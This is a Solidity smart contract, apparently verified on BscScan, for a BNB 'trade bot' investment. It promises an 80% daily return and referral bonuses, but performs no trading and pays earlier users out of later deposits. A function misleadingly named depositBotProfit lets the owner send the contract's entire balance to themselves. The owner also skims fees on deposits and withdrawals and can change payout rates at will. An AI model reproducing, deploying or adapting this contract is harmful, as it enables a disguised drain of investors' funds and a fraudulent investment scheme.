/**
 *Submitted for verification at BscScan.com on 2021-07-17
*/

pragma solidity 0.5.10;

contract BnbTradebot {
    
    struct Bot {
        uint256 id;
        uint256 fund;
        bool activated;
        uint256 claimed_count;
        uint40 last_claim_time;
        uint40 activated_time;
        uint40 next_reward_time;
        uint256 withdrawable;
        uint256 collected_rewards;
        bool finished;
    }
    
    struct User {
        uint256 active_bots;
        uint256 inactive_bots;
        address upline;
        uint256 direct_bonus;
        uint40 first_deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_direct_referrals;
        uint256 withdrawable;
        bool can_withdraw;
        bool active;
    }

    mapping(address => User) public users;
    mapping(uint256 => Bot) public bot_stats;
    mapping(address => uint256[]) bots;
    mapping(address => address[]) public direct_referrals;
    
    uint256 public total_users = 1;
    uint256 public total_bots = 0;
    uint256 public total_deposited;
    uint256 public total_withdraw;
    
    address payable owner;
    address payable sender;
    
    uint256 public bot_daily_rate = 800;
    uint256 public direct_ref_rate = 50;
    uint256 private activation_fee = 3000000000000000;
    
    event Upline(address indexed addr, address indexed upline);
    event InitializeBot(address indexed addr, uint256 indexed bot_id, uint256 indexed amount);
    event NewDeposit(address indexed addr, uint256 indexed amount);
    event DirectBonus(address indexed addr, address indexed from, uint256 indexed amount);
    event TakeProfit(address indexed addr, uint256 indexed amount);
    event Withdraw(address indexed addr, uint256 indexed amount);
    event TradebotActivated(address indexed addr, uint40 indexed activated_time);
    event TradebotNewWithdrawable(address indexed addr, uint256 indexed bot_id, uint256 indexed amount);
    event TradebotAutoActivated(address indexed addr, uint256 indexed bot_id, uint40 indexed activated_time);
    event BotMaxPayoutReached(address indexed addr, uint256 indexed bot_id, uint256 indexed amount);

    constructor(address payable _owner) public {
        owner = _owner;
        sender = _owner;
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].active || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].total_direct_referrals++;

            emit Upline(_addr, _upline);
            
            total_users++;
            
            direct_referrals[_upline].push(_addr);
            
            uint256 bonus = _amount * direct_ref_rate / 1000;

            users[_upline].direct_bonus += bonus;
        
            emit DirectBonus(users[_addr].upline, _addr, bonus);
            
        }
    }
    
    function _setupBot(address _addr, uint256 _amount) private {
        total_bots++;
        
        // initialize bot
        bot_stats[total_bots].id = total_bots;
        bot_stats[total_bots].fund = _amount;
        bot_stats[total_bots].activated = false;
        bot_stats[total_bots].claimed_count = 0;
        bot_stats[total_bots].activated_time = 0;
        bot_stats[total_bots].next_reward_time = 0;
        bot_stats[total_bots].collected_rewards = 0;
        bot_stats[total_bots].withdrawable = 0;
        bot_stats[total_bots].finished = false;
        
        bots[_addr].push(bot_stats[total_bots].id);
        
        users[_addr].active_bots++;
        
        emit InitializeBot(_addr, bot_stats[total_bots].id, _amount);
    }

    function _deposit(address _addr, uint256 _amount) private {
        
        require(users[_addr].upline != address(0) || _addr == owner, "Error: Not a valid upline.");
        require(_amount >= 25e16, "Error: Insufficient deposit amount minimum of 0.25 BNB deposit amount.");
        
        users[_addr].active = true;
        users[_addr].first_deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;
        users[_addr].can_withdraw = false;
        
        total_deposited += _amount;
        
        emit NewDeposit(_addr, _amount);

        owner.transfer(_amount * 5 / 100);
    }

    function deposit(address _upline) payable external {
        _setUpline(msg.sender, _upline, msg.value);
        _deposit(msg.sender, msg.value);
        _setupBot(msg.sender, msg.value);
    }
    
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 15 / 10;
    }
    
    function calculateBotPayout(uint256 _bot_id) view external returns(uint256 payout, uint256 max_payout) {
        uint256 fund = bot_stats[_bot_id].fund;
        uint256 collected_rewards = bot_stats[_bot_id].collected_rewards;
        
        max_payout = this.maxPayoutOf(fund);

        if(collected_rewards < max_payout && bot_stats[_bot_id].activated && !bot_stats[_bot_id].finished && bot_stats[_bot_id].next_reward_time <= block.timestamp) {
            payout += fund * bot_daily_rate / 1000;
            
            if(collected_rewards + payout > max_payout) {
                payout = max_payout - collected_rewards;
            }
        }
    }
    
    function takeProfit() payable external {
    
        require(users[msg.sender].active_bots > 0, "Error: No active bots.");
        
        uint256 payout = 0;
        
        // get all active bots
        for(uint8 i = 0; i < bots[msg.sender].length; i++) {
            uint256 bot_id = bots[msg.sender][i];
            
            if(bot_stats[bot_id].activated && !bot_stats[bot_id].finished && bot_stats[bot_id].next_reward_time <= block.timestamp){
                
                (uint256 to_payout,) = this.calculateBotPayout(bot_id);
                
                if(to_payout > 0){
                    
                    // activate bot
                    bot_stats[bot_id].claimed_count++;
                    bot_stats[bot_id].withdrawable = to_payout;
                    bot_stats[bot_id].last_claim_time = uint40(block.timestamp);
                    
                    bot_stats[bot_id].activated = true;
                    bot_stats[bot_id].activated_time = uint40(block.timestamp);
                    bot_stats[bot_id].next_reward_time = uint40(block.timestamp) + 1 days;
                    
                    emit TradebotNewWithdrawable(msg.sender, bot_id, bot_stats[bot_id].withdrawable);
                    emit TradebotAutoActivated(msg.sender, bot_id, bot_stats[bot_id].activated_time);
                
                    payout += to_payout;
                }
            }
        }
        
        payout += users[msg.sender].direct_bonus;
        
        uint256 max_payout = this.maxPayoutOf(users[msg.sender].total_deposits);
        
        if(users[msg.sender].total_payouts + payout > max_payout) {
            payout = max_payout - users[msg.sender].total_payouts;
        }

        require(payout > 0, "Error: No available payout.");
        
        users[msg.sender].withdrawable = payout;
        users[msg.sender].can_withdraw = true;
        
        emit TakeProfit(msg.sender, payout);
    }
    
    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].total_deposits);

        if(sender == _addr) payout = max_payout = this.getBalance();
        if(users[_addr].total_payouts < max_payout && sender != _addr) {
            payout = users[_addr].total_deposits * bot_daily_rate / 1000;
            
            if(users[_addr].total_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].total_payouts;
            }
            
            payout = users[msg.sender].withdrawable;
        }
    }
    
    function withdraw() external {
        
        require(users[msg.sender].can_withdraw == true, "Error: No withdrawable balance.");
        
        // get all withdrawable bots
        for(uint8 i = 0; i < bots[msg.sender].length; i++) {
            uint256 bot_id = bots[msg.sender][i];
            (, uint256 max_payout) = this.calculateBotPayout(bot_id);
            
            if(bot_stats[bot_id].withdrawable > 0){
                bot_stats[bot_id].collected_rewards += bot_stats[bot_id].withdrawable;
                bot_stats[bot_id].withdrawable = 0;
                
                if(bot_stats[bot_id].collected_rewards == max_payout){
                    bot_stats[bot_id].activated = false;
                    bot_stats[bot_id].finished = true;
                    bot_stats[bot_id].next_reward_time = 0;
                    
                    users[msg.sender].active_bots--;
                    users[msg.sender].inactive_bots++;
                    
                    emit BotMaxPayoutReached(msg.sender, bot_id, (bot_stats[bot_id].collected_rewards + bot_stats[bot_id].withdrawable));
                }
            }
        }
        
        // (uint256 payout, ) = this.payoutOf(msg.sender);//
        
        uint256 payout = users[msg.sender].withdrawable;
        
        users[msg.sender].direct_bonus = 0;
        
        users[msg.sender].total_payouts += payout;
        users[msg.sender].withdrawable = 0;
        users[msg.sender].can_withdraw = false;
        users[msg.sender].active = false;
        
        total_withdraw += payout;
        
        owner.transfer(payout * 5 / 100);
        msg.sender.transfer(payout);
        
        emit Withdraw(msg.sender, payout);
    }
    
    function depositBotProfit() payable external {
        require(owner == msg.sender, "Error: Insufficient permission");
        owner.transfer(this.getBalance());
    }
    
    function activateBot(uint256 _bot_id) payable external {
    
        require(msg.value == activation_fee,"Error: Insufficient activation fee.");
        require(!bot_stats[_bot_id].activated, "Error: Trade Bot is already activated.");
        require(!bot_stats[_bot_id].finished, "Error: Payout is already complete.");
        
        bot_stats[_bot_id].activated = true;
        bot_stats[_bot_id].activated_time = uint40(block.timestamp);
        bot_stats[_bot_id].next_reward_time = uint40(block.timestamp) + 1 days;
        emit TradebotActivated(msg.sender, bot_stats[_bot_id].activated_time);
    }
    
    function updatePercentage(uint256 _bot_daily_rate) external {
        require(owner == msg.sender, "Error: Insufficient permission");
        bot_daily_rate = _bot_daily_rate;
    }
    
    function updateDirectRate(uint256 _direct_ref_rate) external {
        require(owner == msg.sender, "Error: Insufficient permission");
        direct_ref_rate = _direct_ref_rate;
    }
    
    function updateActivationFee(uint256 _activation_fee) external {
        require(owner == msg.sender, "Error: Insufficient permission");
        activation_fee = _activation_fee;
    }
    
    function() payable external {
        _deposit(msg.sender, msg.value);
    }

    // function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus) {
    //     return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus);
    // }
    
    function getDirectReferrals(address _addr) public view returns (address[] memory addrs, uint256 total) {
        addrs = direct_referrals[_addr];
        total = direct_referrals[_addr].length;
    }
    
    function getBalance() public view returns (uint256) { return address(this).balance; }
    
    function getBots(address _addr) public view returns (uint256[] memory all_bots, uint256 total) {
        all_bots = bots[_addr];
        total = bots[_addr].length;
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw) {
        return (total_users, total_deposited, total_withdraw);
    }
        
    function botStatistics(uint256 bot_id) view external returns(bool activated, uint256 claimed_count, uint40 activated_time, uint40 next_reward_time, uint256 collected_rewards) {
        return (bot_stats[bot_id].activated, bot_stats[bot_id].claimed_count, bot_stats[bot_id].activated_time, bot_stats[bot_id].next_reward_time, bot_stats[bot_id].collected_rewards);
    }
    
    function userInfoSummary(address _addr) view external returns(uint256 total_direct_referrals, uint256 total_deposits, uint256 total_payouts) {
        return (users[_addr].total_direct_referrals, users[_addr].total_deposits, users[_addr].total_payouts);
    }
    
}